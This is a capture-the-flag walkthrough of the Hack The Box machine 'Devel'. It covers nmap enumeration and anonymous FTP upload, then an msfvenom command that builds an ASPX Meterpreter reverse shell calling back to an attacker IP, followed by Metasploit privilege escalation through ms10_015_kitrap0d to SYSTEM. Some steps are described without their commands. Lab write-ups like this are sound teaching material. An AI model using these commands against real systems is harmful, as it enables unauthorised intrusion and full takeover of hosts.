* Box: Devel
  - Difficulty: Easy
  - Points: 20
  - Release: 15 Mar 2017
  - IP: 10.10.10.5

###Initial Enumeration

####Nmap Scanning

Let's start with a scan of the target ip address:

`nmap -sC -A -oN devel.nmap 10.10.10.5`

The Nmap scan reveals Microsoft FTP port 21 and Microsoft IIS 7.5 port 80 open.

####Website Enumeration

After opening **Firefox** and visit the website **http://10.10.10.5** we get the default IIS 7 webpage.

Dirbuster enumeration provides us no further insight so we move our eyes over to the open FTP port.

####FTP Enumeration

From our Nmap scan, we can see 2 files under the FTP.

###Exploitation

Connecting anonymously via FTP reveals that it does allow anonymous logins. This misconfiguration is common.

Since our user can upload files, we can simply create a **aspx** reverse shell and execute it by browsing to the file via the web server.

####Payload Generating/Delivery

The following command will create a aspx file that we will use:

`msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.28 LPORT=4444`


**Set up a listener in Metasploit and open the file in the web browser:**

After trying to navigate through some directories we quickly realize we need escalated permissions.

####Privilege

Put the session in the background:

`background`

Then use the following command to suggest local meterpreter exploits that can be used.

After testing the first local exploit  `exploit/windows/local/bypassuac_eventvwr`, we see that it fails due to the IIS user not being a part of the administrators group. (This is usually default and to be expected)

The next exploit we test is:

`exploit/windows/local/ms10_015_kitrap0d`

This will attempt to create a new session with **SYSTEM** privileges.

Now that we have the exploit worked, we have SYSTEM access, let's look for the root and user flags.

The root flag is on the Administrators desktop:

The user flag is on the "babis" user's desktop:
